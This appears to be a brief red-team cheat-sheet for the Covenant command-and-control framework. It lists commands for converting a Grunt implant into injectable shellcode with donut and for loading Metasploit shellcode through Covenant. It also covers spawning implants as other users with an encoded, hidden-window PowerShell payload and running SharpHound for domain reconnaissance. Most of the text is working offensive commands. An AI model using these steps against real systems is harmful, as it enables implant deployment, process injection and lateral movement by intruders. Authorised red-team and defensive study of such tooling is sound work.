A few notes on Covenant usage, at the time of writing two common options do not exist:

* Shellcode Generation
* Built-in socks support

To get around the first one, it is possible to generate a Grunt EXE and use donut to compile a position independant shellcode, which can then be injected into other processes.

    .\donut.exe -f GruntStager.exe -o grunt.bin

For the built-in socks stuff, MSF can be used along with the ShellCode option in Covenant:

Format the shellcode

    xxd -ps msf.bin| tr -d '\n'

Place the output from above where "hex" is stated below:

    Covenant> ShellCode hex

#### Useful Commands

##### Grunt Spawning

To spawn other grunts for other users, it is possible to leverage the "ShellRunAs" command:

    ShellRunAs "powershell.exe -nop -w 1 -enc PAYLOAD"

##### Run .NET Assemblies

    Assembly /assemblyname:"SharpHound" /parameters:"-C All"
